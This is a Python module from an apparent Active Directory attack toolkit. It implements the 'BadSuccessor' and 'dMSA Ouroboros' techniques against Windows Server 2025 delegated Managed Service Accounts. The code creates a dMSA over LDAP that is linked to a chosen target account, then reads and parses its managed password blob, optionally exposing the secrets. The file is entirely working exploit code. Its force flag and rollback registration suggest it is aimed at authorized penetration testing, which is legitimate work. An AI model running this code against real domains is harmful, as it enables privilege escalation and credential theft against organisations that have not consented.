"""Windows Server 2025 dMSA BadSuccessor and Ouroboros."""

from __future__ import annotations

import secrets
from typing import Any

from ldap3 import MODIFY_REPLACE
from rich.console import Console

from adaf_attack.capabilities.capability_catalog import register_from_catalog
from adaf_attack.capabilities.gmsa_laps_enum import _parse_managed_password_blob
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_ops import (
    attr_value,
    encode_unicode_pwd,
    finish,
    lookup_sam,
    register_object_rollback,
    require_force,
    require_param,
)
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


def _computers_ou(base_dn: str) -> str:
    return f"CN=Managed Service Accounts,{base_dn}"


def _create_dmsa(
    conn: Any,
    session: Session,
    base_dn: str,
    name: str,
    preceded_dn: str,
    password: str,
) -> dict[str, Any]:
    sam = name if name.endswith("$") else f"{name}$"
    cn = sam.rstrip("$")
    dn = f"CN={cn},{_computers_ou(base_dn)}"
    attrs = {
        "objectClass": [
            "top",
            "msDS-GroupManagedServiceAccount",
            "msDS-DelegatedManagedServiceAccount",
        ],
        "sAMAccountName": sam,
        "userAccountControl": 4096,
        "unicodePwd": encode_unicode_pwd(password),
        "msDS-ManagedAccountPrecededByLink": preceded_dn,
        "dNSHostName": f"{cn.lower()}.invalid",
    }
    ok = bool(conn.add(dn, attributes=attrs))
    if ok:
        register_object_rollback(session, target_dn=dn, rollback="Delete the created dMSA object.")
    return {
        "ok": ok,
        "dn": dn,
        "sam": sam,
        "preceded_by": preceded_dn,
        "ldap_result": str(conn.result),
    }


def _read_managed_password(conn: Any, dn: str, include_secrets: bool) -> dict[str, Any]:
    conn.search(dn, "(objectClass=*)", attributes=["msDS-ManagedPassword", "sAMAccountName"])
    if not conn.entries:
        return {"present": False}
    entry = conn.entries[0]
    raw = attr_value(entry, "msDS-ManagedPassword")
    if raw is None:
        return {"present": False}
    blob = raw.encode("latin-1", errors="replace") if isinstance(raw, str) else bytes(raw)
    parsed = _parse_managed_password_blob(blob)
    out: dict[str, Any] = {"present": True, "blob_len": len(blob)}
    if include_secrets and parsed:
        out.update(parsed)
    elif parsed:
        out["parsed"] = True
    return out


@register_from_catalog("badsuccessor")
class BadSuccessor:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        include_secrets: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("badsuccessor", force)
        preceded = require_param(kwargs, "preceded_by", "target", "sam")
        name = str(kwargs.get("name") or kwargs.get("computer") or f"adaf{secrets.token_hex(3)}")
        password = str(kwargs.get("password") or (secrets.token_urlsafe(12) + "Aa1!"))
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            found = lookup_sam(conn, base_dn, preceded)
            if not found:
                raise RuntimeError(f"Preceded-by principal not found: {preceded}")
            preceded_dn, _entry = found
            created = _create_dmsa(conn, session, base_dn, name, preceded_dn, password)
            secret = (
                _read_managed_password(conn, created["dn"], include_secrets)
                if created["ok"]
                else {}
            )
            result = {
                "ok": bool(created.get("ok")),
                "dmsa": created,
                "managed_password": secret,
            }
            if created.get("ok"):
                graph.add_edge(
                    f"GMSA@{created['sam'].upper()}@{target.domain.upper()}",
                    f"USER@{preceded.upper()}@{target.domain.upper()}",
                    "BadSuccessor",
                )
            console.print(
                f"[green]badsuccessor[/green] {created.get('sam')} ok={created.get('ok')}"
            )
            return finish(session, graph, "badsuccessor", result, ok=result["ok"])
        finally:
            conn.unbind()


@register_from_catalog("dmsa-ouroboros")
class DmsaOuroboros:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        include_secrets: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("dmsa-ouroboros", force)
        sam = kwargs.get("sam") or kwargs.get("dmsa")
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            if sam:
                found = lookup_sam(
                    conn,
                    base_dn,
                    str(sam),
                    [
                        "distinguishedName",
                        "msDS-ManagedPassword",
                        "msDS-ManagedAccountPrecededByLink",
                    ],
                )
                if not found:
                    raise RuntimeError(f"dMSA not found: {sam}")
                dn, _entry = found
                created = {"ok": True, "dn": dn, "sam": sam, "existing": True}
            else:
                preceded = require_param(kwargs, "preceded_by", "target")
                found = lookup_sam(conn, base_dn, preceded)
                if not found:
                    raise RuntimeError(f"Preceded-by principal not found: {preceded}")
                name = str(kwargs.get("name") or f"ouro{secrets.token_hex(3)}")
                password = str(kwargs.get("password") or (secrets.token_urlsafe(12) + "Aa1!"))
                created = _create_dmsa(conn, session, base_dn, name, found[0], password)
                dn = created["dn"]
            if created.get("ok") and kwargs.get("superordinate"):
                conn.modify(
                    dn,
                    {
                        "msDS-DelegatedManagedServiceAccount": [
                            (MODIFY_REPLACE, [str(kwargs["superordinate"])])
                        ]
                    },
                )
            secret = _read_managed_password(conn, dn, include_secrets) if created.get("ok") else {}
            result = {"ok": bool(created.get("ok")), "dmsa": created, "managed_password": secret}
            console.print(f"[green]dmsa-ouroboros[/green] ok={result['ok']}")
            return finish(session, graph, "dmsa-ouroboros", result, ok=result["ok"])
        finally:
            conn.unbind()
